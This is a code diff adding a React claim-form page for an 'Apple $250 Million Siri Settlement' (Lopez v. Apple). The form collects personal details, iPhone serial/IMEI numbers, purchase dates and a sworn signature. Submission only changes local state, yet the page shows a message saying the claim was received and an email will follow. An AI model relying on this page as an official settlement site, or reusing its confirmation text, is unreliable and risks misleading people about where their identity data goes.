@@ -1,0 +1,284 @@
+import { createFileRoute, Link } from "@tanstack/react-router";
+import { useState } from "react";
+import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import { Textarea } from "@/components/ui/textarea";
+import { Checkbox } from "@/components/ui/checkbox";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { Separator } from "@/components/ui/separator";
+import { Apple, ChevronLeft, Plus, Trash2, ShieldCheck } from "lucide-react";
+
+export const Route = createFileRoute("/claim")({
+  head: () => ({
+    meta: [
+      { title: "Complete Your Claim — Apple Siri Settlement" },
+      { name: "description", content: "Complete your claim information for the Apple $250 Million Siri Settlement (Lopez v. Apple Inc.)." },
+      { property: "og:title", content: "Complete Your Claim — Apple Siri Settlement" },
+      { property: "og:description", content: "Provide your personal and device information to file your Apple Siri Settlement claim." },
+      { property: "og:type", content: "website" },
+      { name: "twitter:card", content: "summary_large_image" },
+    ],
+  }),
+  component: ClaimPage,
+});
+
+const IPHONE_MODELS = [
+  "iPhone X", "iPhone XR", "iPhone XS", "iPhone XS Max",
+  "iPhone 11", "iPhone 11 Pro", "iPhone 11 Pro Max",
+  "iPhone SE (2nd gen)", "iPhone 12 mini", "iPhone 12", "iPhone 12 Pro", "iPhone 12 Pro Max",
+  "iPhone 13 mini", "iPhone 13", "iPhone 13 Pro", "iPhone 13 Pro Max",
+  "iPhone SE (3rd gen)", "iPhone 14", "iPhone 14 Plus", "iPhone 14 Pro", "iPhone 14 Pro Max",
+  "iPhone 15", "iPhone 15 Plus", "iPhone 15 Pro", "iPhone 15 Pro Max",
+  "iPhone 16", "iPhone 16 Plus", "iPhone 16 Pro", "iPhone 16 Pro Max",
+  "iPhone 17", "iPhone 17 Plus", "iPhone 17 Pro", "iPhone 17 Pro Max",
+];
+
+type Device = { model: string; serial: string; purchaseDate: string };
+
+function ClaimPage() {
+  const [devices, setDevices] = useState<Device[]>([
+    { model: "", serial: "", purchaseDate: "" },
+  ]);
+  const [submitted, setSubmitted] = useState(false);
+
+  const addDevice = () => {
+    if (devices.length < 5) setDevices([...devices, { model: "", serial: "", purchaseDate: "" }]);
+  };
+  const removeDevice = (i: number) => setDevices(devices.filter((_, idx) => idx !== i));
+  const updateDevice = (i: number, key: keyof Device, value: string) => {
+    setDevices(devices.map((d, idx) => (idx === i ? { ...d, [key]: value } : d)));
+  };
+
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    setSubmitted(true);
+    window.scrollTo({ top: 0, behavior: "smooth" });
+  };
+
+  return (
+    <div className="min-h-screen bg-background">
+      {/* Header */}
+      <header className="border-b bg-card">
+        <div className="mx-auto max-w-3xl px-6 py-5 flex items-center justify-between">
+          <Link to="/" className="inline-flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground transition-colors">
+            <ChevronLeft className="h-4 w-4" />
+            Back
+          </Link>
+          <div className="inline-flex items-center gap-2">
+            <Apple className="h-5 w-5 text-primary" />
+            <span className="text-sm font-medium">Siri Settlement</span>
+          </div>
+        </div>
+      </header>
+
+      <main className="mx-auto max-w-3xl px-6 py-10 md:py-14">
+        {submitted ? (
+          <Card>
+            <CardHeader>
+              <div className="mb-3 inline-flex h-12 w-12 items-center justify-center rounded-2xl bg-primary/10">
+                <ShieldCheck className="h-6 w-6 text-primary" />
+              </div>
+              <CardTitle>Claim Submitted</CardTitle>
+              <CardDescription>
+                Thank you. Your claim has been received and will be reviewed by the Settlement Administrator.
+                You will receive a confirmation email shortly.
+              </CardDescription>
+            </CardHeader>
+            <CardContent>
+              <Link to="/"><Button variant="outline">Return Home</Button></Link>
+            </CardContent>
+          </Card>
+        ) : (
+          <>
+            <div className="mb-8">
+              <h1 className="text-2xl md:text-3xl font-semibold tracking-tight text-foreground">
+                Complete Your Claim Information
+              </h1>
+              <p className="mt-3 text-sm leading-relaxed text-muted-foreground">
+                To proceed with your Apple $250 Million Siri Settlement claim (<em>Lopez v. Apple Inc.</em>),
+                please provide your personal information and eligible device details below. You will also be
+                required to make a sworn declaration confirming that you meet the eligibility requirements.
+              </p>
+            </div>
+
+            <form onSubmit={handleSubmit} className="space-y-8">
+              {/* Personal Information */}
+              <Card>
+                <CardHeader>
+                  <CardTitle className="text-lg">Personal Information</CardTitle>
+                  <CardDescription>Your legal name and contact details.</CardDescription>
+                </CardHeader>
+                <CardContent className="space-y-4">
+                  <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
+                    <div className="space-y-2">
+                      <Label htmlFor="firstName">First Name</Label>
+                      <Input id="firstName" required />
+                    </div>
+                    <div className="space-y-2">
+                      <Label htmlFor="lastName">Last Name</Label>
+                      <Input id="lastName" required />
+                    </div>
+                  </div>
+                  <div className="space-y-2">
+                    <Label htmlFor="email">Email Address</Label>
+                    <Input id="email" type="email" required />
+                  </div>
+                  <div className="space-y-2">
+                    <Label htmlFor="phone">Phone Number</Label>
+                    <Input id="phone" type="tel" />
+                  </div>
+                  <Separator />
+                  <div className="space-y-2">
+                    <Label htmlFor="address">Street Address</Label>
+                    <Input id="address" required />
+                  </div>
+                  <div className="grid grid-cols-1 gap-4 sm:grid-cols-3">
+                    <div className="space-y-2 sm:col-span-1">
+                      <Label htmlFor="city">City</Label>
+                      <Input id="city" required />
+                    </div>
+                    <div className="space-y-2">
+                      <Label htmlFor="state">State</Label>
+                      <Input id="state" required />
+                    </div>
+                    <div className="space-y-2">
+                      <Label htmlFor="zip">ZIP Code</Label>
+                      <Input id="zip" required />
+                    </div>
+                  </div>
+                </CardContent>
+              </Card>
+
+              {/* Device Information */}
+              <Card>
+                <CardHeader>
+                  <CardTitle className="text-lg">Eligible Device Information</CardTitle>
+                  <CardDescription>
+                    Add each eligible iPhone (iPhone X — iPhone 17 Pro Max) purchased between
+                    June 10, 2024 and March 29, 2026. Up to 5 devices per claim.
+                  </CardDescription>
+                </CardHeader>
+                <CardContent className="space-y-6">
+                  {devices.map((device, i) => (
+                    <div key={i} className="rounded-lg border p-4 space-y-4">
+                      <div className="flex items-center justify-between">
+                        <p className="text-sm font-medium text-foreground">Device {i + 1}</p>
+                        {devices.length > 1 && (
+                          <Button
+                            type="button"
+                            variant="ghost"
+                            size="sm"
+                            onClick={() => removeDevice(i)}
+                            className="h-8 text-muted-foreground hover:text-destructive"
+                          >
+                            <Trash2 className="h-4 w-4" />
+                          </Button>
+                        )}
+                      </div>
+                      <div className="space-y-2">
+                        <Label>iPhone Model</Label>
+                        <Select
+                          value={device.model}
+                          onValueChange={(v) => updateDevice(i, "model", v)}
+                        >
+                          <SelectTrigger>
+                            <SelectValue placeholder="Select a model" />
+                          </SelectTrigger>
+                          <SelectContent>
+                            {IPHONE_MODELS.map((m) => (
+                              <SelectItem key={m} value={m}>{m}</SelectItem>
+                            ))}
+                          </SelectContent>
+                        </Select>
+                      </div>
+                      <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
+                        <div className="space-y-2">
+                          <Label htmlFor={`serial-${i}`}>Serial Number / IMEI</Label>
+                          <Input
+                            id={`serial-${i}`}
+                            value={device.serial}
+                            onChange={(e) => updateDevice(i, "serial", e.target.value)}
+                            required
+                          />
+                        </div>
+                        <div className="space-y-2">
+                          <Label htmlFor={`date-${i}`}>Purchase Date</Label>
+                          <Input
+                            id={`date-${i}`}
+                            type="date"
+                            min="2024-06-10"
+                            max="2026-03-29"
+                            value={device.purchaseDate}
+                            onChange={(e) => updateDevice(i, "purchaseDate", e.target.value)}
+                            required
+                          />
+                        </div>
+                      </div>
+                    </div>
+                  ))}
+                  {devices.length < 5 && (
+                    <Button type="button" variant="outline" onClick={addDevice} className="w-full">
+                      <Plus className="mr-2 h-4 w-4" />
+                      Add Another Device
+                    </Button>
+                  )}
+                </CardContent>
+              </Card>
+
+              {/* Sworn Declaration */}
+              <Card>
+                <CardHeader>
+                  <CardTitle className="text-lg">Sworn Declaration</CardTitle>
+                  <CardDescription>
+                    Please read and confirm the following statements under penalty of perjury.
+                  </CardDescription>
+                </CardHeader>
+                <CardContent className="space-y-4">
+                  <div className="flex items-start gap-3">
+                    <Checkbox id="d1" required className="mt-1" />
+                    <Label htmlFor="d1" className="text-sm font-normal leading-relaxed text-muted-foreground">
+                      I declare under penalty of perjury under the laws of the United States that the
+                      information provided in this claim form is true and correct to the best of my knowledge.
+                    </Label>
+                  </div>
+                  <div className="flex items-start gap-3">
+                    <Checkbox id="d2" required className="mt-1" />
+                    <Label htmlFor="d2" className="text-sm font-normal leading-relaxed text-muted-foreground">
+                      I confirm that I am a member of the settlement class and that I purchased the
+                      eligible device(s) listed above between June 10, 2024 and March 29, 2026.
+                    </Label>
+                  </div>
+                  <div className="flex items-start gap-3">
+                    <Checkbox id="d3" required className="mt-1" />
+                    <Label htmlFor="d3" className="text-sm font-normal leading-relaxed text-muted-foreground">
+                      I understand that submitting false information may result in denial of my claim and
+                      may subject me to civil and criminal penalties.
+                    </Label>
+                  </div>
+                  <Separator />
+                  <div className="space-y-2">
+                    <Label htmlFor="signature">Electronic Signature (type your full legal name)</Label>
+                    <Input id="signature" placeholder="Full legal name" required />
+                  </div>
+                  <div className="space-y-2">
+                    <Label htmlFor="notes">Additional Comments (optional)</Label>
+                    <Textarea id="notes" rows={3} />
+                  </div>
+                </CardContent>
+              </Card>
+
+              <div className="flex flex-col-reverse sm:flex-row sm:justify-end gap-3">
+                <Link to="/"><Button type="button" variant="outline" className="w-full sm:w-auto">Cancel</Button></Link>
+                <Button type="submit" size="lg" className="w-full sm:w-auto">
+                  Submit Claim
+                </Button>
+              </div>
+            </form>
+          </>
+        )}
+      </main>
+    </div>
+  );
+}
